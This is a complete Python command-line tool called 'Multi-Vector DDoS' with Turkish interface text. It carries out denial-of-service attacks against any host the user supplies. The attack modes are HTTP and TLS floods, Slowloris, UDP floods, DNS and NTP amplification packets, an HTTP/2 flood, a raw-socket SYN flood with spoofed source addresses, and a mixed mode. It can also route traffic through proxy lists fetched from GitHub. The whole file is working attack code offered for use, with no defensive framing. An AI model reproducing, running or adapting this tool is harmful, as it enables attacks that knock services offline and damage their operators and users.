#!/usr/bin/env python3
import argparse,concurrent.futures,logging,os,random,ssl,struct,sys,time,threading,socket,subprocess,urllib.parse,importlib.util
V="2.0"
PS=["https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt","https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"]
UA=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0","Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0","Mozilla/5.0 (Windows NT 10.0; rv:121.0) Firefox/121.0"]
RF=["https://www.google.com/","https://www.bing.com/","https://t.co/"]
HM=["GET","POST","HEAD","OPTIONS","PUT","DELETE","PATCH","TRACE"]
CP=["/","/index.html","/index.php","/wp-admin/","/login","/admin","/api/","/api/v1/","/graphql","/search","/about","/contact","/products","/cart","/checkout","/account","/user","/robots.txt","/sitemap.xml","/favicon.ico","/.env","/config.php","/admin/panel/","/cgi-bin/","/xmlrpc.php","/wp-content/","/uploads/","/download/","/.git/config","/vendor/"]
HP={"connection":["keep-alive","close"],"accept":["text/html,*/*;q=0.8","*/*"],"accept-language":["en-US,en;q=0.5","tr-TR,tr;q=0.9,en;q=0.8"]}
logging.basicConfig(level=logging.INFO,format="[%(asctime)s]%(message)s",datefmt="%H:%M:%S");log=logging.getLogger("x")
def cc(t,c): return t if sys.platform=="win32" else f"\033[{c}m{t}\033[0m"
red=lambda t:cc(t,"91");green=lambda t:cc(t,"92");yellow=lambda t:cc(t,"93");cyan=lambda t:cc(t,"96")

class S:
    def __init__(s): s.lock=threading.Lock();s.t=s.f=s.s=s.bs=s.br=0;s.st=time.time();s.err={}
    def a(s,o=True,sent=0,recv=0):
        with s.lock: s.t+=1;s.bs+=sent;s.br+=recv
        if o: s.s+=1
        else: s.f+=1
    def ae(s,e):
        with s.lock: s.err[e]=s.err.get(e,0)+1
    def rp(s):
        e=time.time()-s.st;r=s.t/e if e>0 else 0
        print(f"\n{'='*60}\n  {cyan('ISTATISTIK')}\n{'='*60}")
        print(f"  Sure:{e:.1f}s T:{s.t:,} B:{green(str(s.s))} Basarisiz:{red(str(s.f))} RPS:{r:.0f}")
        if s.err:
            for e,c in sorted(s.err.items(),key=lambda x:-x[1]): print(f"    {e}:{c}")
        print("="*60)
st=S()
def rb(mi=1,ma=1024): return os.urandom(random.randint(mi,ma))
def rs(l=8,c="abcdef0123456789"): return "".join(random.choice(c) for _ in range(l))

class P:
    def __init__(s): s.px=[];s.lock=threading.Lock();s.i=0
    def _p(s,l):
        pr="http";u=pw=h=po=None
        if "://" in l: pr,l=l.split("://",1)
        if "@" in l:
            a,l=l.split("@",1)
            if ":" in a: u,pw=a.split(":",1)
        if ":" in l:
            h,po=l.rsplit(":",1)
            try: po=int(po)
            except: return None
            return {"p":pr,"h":h,"r":po}
        return None
    def load(s,fp):
        c=0
        try:
            with open(fp) as f:
                for l in f:
                    l=l.strip()
                    if not l or l[0]=="#": continue
                    p=s._p(l)
                    if p: s.px.append(p);c+=1
        except Exception as e: log.error(f"P:{e}")
        return c
    def fetch(s,to=10):
        import urllib.request;c=0
        for url in PS:
            try:
                req=urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req,timeout=to) as r:
                    for l in r.read().decode(errors="ignore").splitlines():
                        p=s._p(l.strip())
                        if p and p not in s.px:
                            with s.lock: s.px.append(p);c+=1
            except: pass
        return c
    def get(s):
        with s.lock:
            if not s.px: return None
            p=s.px[s.i%len(s.px)];s.i+=1; return p

class E:
    def __init__(s,tg,th=100,d=0,pm=None): s.tg=tg;s.th=th;s.d=d;s.pm=pm;s.se=threading.Event();s.ts=[]
    def stop(s): s.se.set()
    @property
    def rn(s): return not s.se.is_set()
    def rt(s,fn):
        s.se.clear();s.ts=[]
        for i in range(s.th):
            t=threading.Thread(target=fn,args=(i,),daemon=True);t.start();s.ts.append(t)
        if s.d>0: log.info(f"{s.d}s...");time.sleep(s.d);s.stop()
        else:
            try:
                while s.rn: time.sleep(0.5)
            except KeyboardInterrupt: s.stop()
        for t in s.ts: t.join(timeout=1)
        return st.rp()

class H(E):
    def __init__(s,*a,**kw):
        super().__init__(*a,**kw)
        s.cx=ssl.create_default_context();s.cx.check_hostname=False;s.cx.verify_mode=ssl.CERT_NONE
        s.cx.set_ciphers("ALL:@SECLEVEL=0")
    def _s(s,px=None):
        sl=s.tg.get("s",False)
        sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sk.settimeout(10)
        sk.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        if sl: sk=s.cx.wrap_socket(sk,server_hostname=s.tg["h"])
        sk.connect((s.tg["h"],s.tg["p"]));return sk
    def _w(s,tid):
        while s.rn:
            try:
                m=random.choice(HM);pt=random.choice(CP)
                if random.random()<0.2: pt+="?"+rs(6)+"="+rs(random.randint(4,12))
                sk=s._s()
                hd={"Host":s.tg["h"],"User-Agent":random.choice(UA),"Accept":random.choice(HP["accept"])}
                if random.random()<0.3: hd["Referer"]=random.choice(RF)
                if random.random()<0.2: hd["X-Forwarded-For"]=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                body=rb(64,4096) if m in ("POST","PUT","PATCH") else None
                if body: hd["Content-Length"]=str(len(body))
                r=f"{m} {pt} HTTP/1.1\r\n"
                for k,v in hd.items(): r+=f"{k}: {v}\r\n"
                r+="\r\n";b=r.encode()
                if body: b+=body
                sk.send(b)
                try: resp=sk.recv(4096);st.a(True,len(b),len(resp))
                except socket.timeout: st.a(True,len(b))
                sk.close()
            except Exception as e: st.ae(type(e).__name__);st.a(False)
    def run(s): print(f"\n  {cyan('HTTP/HTTPS Flood')}");return s.rt(s._w)

class L(E):
    def __init__(s,*a,**kw):
        super().__init__(*a,**kw)
        s.cx=ssl.create_default_context();s.cx.check_hostname=False;s.cx.verify_mode=ssl.CERT_NONE
    def _w(s,tid):
        while s.rn:
            cc=[]
            for _ in range(random.randint(5,15)):
                if not s.rn: break
                try:
                    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sk.settimeout(30)
                    if s.tg.get("s"): sk=s.cx.wrap_socket(sk,server_hostname=s.tg["h"])
                    sk.connect((s.tg["h"],s.tg["p"]))
                    sk.send(f"GET {random.choice(CP)} HTTP/1.1\r\nHost: {s.tg['h']}\r\n\r\n".encode())
                    cc.append(sk)
                except: continue
            ka=0
            while s.rn and cc:
                ka+=1
                for sk in cc[:]:
                    if not s.rn: break
                    try:
                        if ka%3==0: sk.send(f"X-KeepAlive:{random.randint(1000,9999)}\r\n".encode())
                        st.a(True,sent=40)
                    except:
                        try: sk.close()
                        except: pass
                        cc.remove(sk);st.ae("SL")
                time.sleep(random.uniform(5,15))
            for sk in cc:
                try: sk.close()
                except: pass
    def run(s): print(f"\n  {cyan('Slowloris')}");return s.rt(s._w)

class U(E):
    def _w(s,tid):
        while s.rn:
            try:
                sk=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);sk.settimeout(2)
                p=rb(64,65535);st.a(True,sk.sendto(p,(s.tg["h"],s.tg["p"])));sk.close()
            except: st.ae("U");st.a(False)
    def run(s): print(f"\n  {cyan('UDP Flood')}");return s.rt(s._w)

class D(E):
    def __init__(s,*a,**kw):
        super().__init__(*a,**kw);s.qs=[]
        for d in ["google.com","cloudflare.com","facebook.com","github.com"]:
            p=struct.pack(">HHHHHH",random.randint(0,65535),0x0100,1,0,0,0)
            for pt in d.split("."): p+=struct.pack("B",len(pt))+pt.encode()
            p+=struct.pack("B",0)+struct.pack(">HH",255,1);s.qs.append(p)
    def _w(s,tid):
        while s.rn:
            try:
                sk=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);sk.settimeout(2)
                for q in s.qs:
                    if not s.rn: break
                    st.a(True,sk.sendto(q,(s.tg["h"],s.tg["p"])))
                sk.close()
            except: st.ae("D");st.a(False)
    def run(s): print(f"\n  {cyan('DNS Amp')}");return s.rt(s._w)

class Ssl(E):
    def _w(s,tid):
        cx=ssl.create_default_context();cx.check_hostname=False;cx.verify_mode=ssl.CERT_NONE
        while s.rn:
            try:
                sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sk.settimeout(10)
                sk.connect((s.tg["h"],s.tg["p"]));ss=cx.wrap_socket(sk,server_hostname=s.tg["h"])
                ss.send(b"GET / HTTP/1.1\r\nHost: "+s.tg["h"].encode()+b"\r\n\r\n")
                try: ss.recv(4096)
                except: pass
                st.a(True);ss.close()
            except: st.ae("SSL");st.a(False)
    def run(s): print(f"\n  {cyan('SSL/TLS Flood')}");return s.rt(s._w)

class Syn(E):
    def _ck(s,d):
        if len(d)%2: d+=b"\x00"
        su=0
        for i in range(0,len(d),2): w=(d[i]<<8)+d[i+1];su+=w
        su=(su>>16)+(su&0xffff);su=(su>>16)+su;return ~su&0xffff
    def _sy(s,sip,sp,dip,dp):
        ip_h=struct.pack("!BBHHHBBH4s4s",(4<<4)+5,0,40,random.randint(1,65535),0,random.randint(64,255),socket.IPPROTO_TCP,0,socket.inet_aton(sip),socket.inet_aton(dip))
        tcph=struct.pack("!HHLLBBHHH",sp,dp,random.randint(0,4294967295),0,5<<4,0x02,socket.htons(random.randint(1024,65535)),0,0)
        ph=struct.pack("!4s4sBBH",socket.inet_aton(sip),socket.inet_aton(dip),0,socket.IPPROTO_TCP,len(tcph))
        ck=s._ck(ph+tcph)
        tcph=struct.pack("!HHLLBBH",sp,dp,random.randint(0,4294967295),0,5<<4,0x02,socket.htons(random.randint(1024,65535)))+struct.pack("H",ck)+struct.pack("!H",0)
        ck=s._ck(ip_h)
        ip_h=struct.pack("!BBHHHBBH4s4s",(4<<4)+5,0,40,random.randint(1,65535),0,random.randint(64,255),socket.IPPROTO_TCP,ck,socket.inet_aton(sip),socket.inet_aton(dip))
        return ip_h+tcph
    def _w(s,tid):
        try:
            sk=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW);sk.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
        except PermissionError: log.error(red("SYN:Root/admin!"));s.stop();return
        except Exception as e: log.error(red(f"SYN:{e}"));s.stop();return
        while s.rn:
            try:
                sip=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                st.a(True,sk.sendto(s._sy(sip,random.randint(1024,65535),s.tg["h"],s.tg["p"]),(s.tg["h"],0)))
            except: st.ae("SYN");st.a(False)
    def run(s): print(f"\n  {cyan('SYN Flood')}\n  {yellow('Root/Admin gerekli!')}");return s.rt(s._w)

class H2(E):
    def _w(s,tid):
        while s.rn:
            try:
                pref=b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";sf=b"\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x64"
                sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sk.settimeout(10)
                if s.tg.get("s"):
                    cx=ssl.create_default_context();cx.check_hostname=False;cx.verify_mode=ssl.CERT_NONE
                    cx.set_alpn_protocols(["h2"]);sk=cx.wrap_socket(sk,server_hostname=s.tg["h"])
                sk.connect((s.tg["h"],s.tg["p"]));sk.send(pref+sf)
                for sid in range(1,31,2):
                    if not s.rn: break
                    hb=b"\x82\x87\x86\x41"+s.tg["h"].encode()
                    fh=struct.pack("!IBB",len(hb),0x01,0x04)+struct.pack("!I",sid)[:3]
                    sk.send(fh+hb);st.a(True,len(fh)+len(hb))
                sk.close()
            except: st.ae("H2");st.a(False)
    def run(s): print(f"\n  {cyan('HTTP/2 Flood')}");return s.rt(s._w)

class N(E):
    def __init__(s,*a,**kw):
        super().__init__(*a,**kw);s.pl=b"\x17\x00\x03\x2a"+b"\x00"*4
    def _w(s,tid):
        while s.rn:
            try:
                sk=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);sk.settimeout(2)
                st.a(True,sk.sendto(s.pl,(s.tg["h"],s.tg["p"])));sk.close()
            except: st.ae("NTP");st.a(False)
    def run(s): print(f"\n  {cyan('NTP Amp')}");return s.rt(s._w)

class M(E):
    def __init__(s,tg,th=200,d=0,pm=None):
        super().__init__(tg,th,d,pm);t=max(1,th//4)
        s.es=[H(tg,t,d,pm),L(tg,t,d,pm),Ssl(tg,t,d,pm),U(tg,t,d,pm)]
    def run(s):
        print(f"\n  {cyan('KARMA SALDIRI')}")
        for e in s.es: e.se=s.se
        for e,w in zip(s.es,[e._w for e in s.es]): e.rt(w)
        if s.d>0: time.sleep(s.d)
        else:
            try:
                while s.rn: time.sleep(0.5)
            except KeyboardInterrupt: pass
        s.stop();return st.rp()

def pt(s):
    tg={"h":"","p":80,"s":False,"pa":"/"};s=s.strip()
    if s.startswith(("http://","https://")):
        p=urllib.parse.urlparse(s);tg["h"]=p.hostname or "";tg["p"]=p.port or (443 if p.scheme=="https" else 80)
        tg["s"]=p.scheme=="https";tg["pa"]=p.path or "/"
        if p.query: tg["pa"]+="?"+p.query;return tg
    if ":" in s:
        h,po=s.rsplit(":",1);tg["h"]=h
        try: tg["p"]=int(po);tg["s"]=tg["p"]==443
        except: print(red("Port!"));sys.exit(1);return tg
    tg["h"]=s;return tg

def cd():
    req={"socks":"PySocks"};miss=[]
    for mod,pip in req.items():
        if importlib.util.find_spec(mod) is None: miss.append(pip)
    if miss:
        print(f"  {yellow('Eksik kutuphaneler...')}")
        try:
            subprocess.check_call([sys.executable,"-m","pip","install",*miss,"-q","--quiet"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            print(f"  {green('Tamam')}")
        except: print(f"  {red('Hata! pip install PySocks')}");return False
    return True

def main():
    print(f"\n{'='*60}\n  Multi-Vector DDoS v{V} | 8 Vectors | Proxy | Cross-Platform\n{'='*60}")
    p=argparse.ArgumentParser(description="DDoS Tool")
    p.add_argument("-t","--target",help="Hedef");p.add_argument("-m","--mode",default="http",help="Mod")
    p.add_argument("-p","--threads",type=int,default=100,help="Thread");p.add_argument("-d","--duration",type=int,default=0,help="Sure(s)")
    p.add_argument("--proxy",action="store_true",help="Proxy");p.add_argument("--proxy-file",help="Proxy dosyasi")
    p.add_argument("--list-modes",action="store_true",help="Liste");p.add_argument("--about",action="store_true",help="Hakkinda")
    args=p.parse_args()
    if args.list_modes:
        print(f"\n  {cyan('Modlar:')}")
        for m,d in [("http","HTTP Flood"),("slowloris","Slowloris"),("udp","UDP"),("dns","DNS"),("ssl","SSL"),("syn","SYN"),("http2","HTTP/2"),("ntp","NTP"),("mixed","Karma")]: print(f"  {green(m):<15}{d}")
        return
    if args.about: print(f"\nDDoS v{V}\nCross-Platform\n8 Vectors\n");return
    if not args.target: p.print_help();print(f"\n  {red('Hedef gerekli!')}");sys.exit(1)
    cd();tg=pt(args.target)
    print(f"\n  {cyan('KONFIGURASYON')}\n  {'-'*40}")
    print(f"  {tg['h']}:{tg['p']} SSL:{tg.get('s',False)} Mod:{args.mode} Thread:{args.threads} Sure:{'Sonsuz'if args.duration==0 else f'{args.duration}s'} Proxy:{'Aktif'if args.proxy else 'Kapali'}")
    pm=None
    if args.proxy:
        pm=P()
        if args.proxy_file: log.info(f"{pm.load(args.proxy_file)} proxy")
        else: log.info("Proxy taranıyor...");log.info(f"{pm.fetch()} proxy")
        if not pm.px: log.warning("Proxy yok");pm=None
    if args.mode not in ("udp","dns","ntp","syn"): tg["s"]=tg["p"]==443 or tg["s"]
 
    em={"http":H,"slowloris":L,"udp":U,"dns":D,"ssl":Ssl,"syn":Syn,"http2":H2,"ntp":N,"mixed":M}
    if args.mode not in em: print(red("Bilinmeyen mod!"));sys.exit(1)
    eng=em[args.mode](tg,args.threads,args.duration,pm)
    print(f"\n  {yellow('Saldiri basliyor... Ctrl+C durdurur')}")
    try: eng.run()
    except KeyboardInterrupt: print(f"\n  {yellow('Durduruldu.')}");eng.stop();st.rp()

if __name__=="__main__": main()
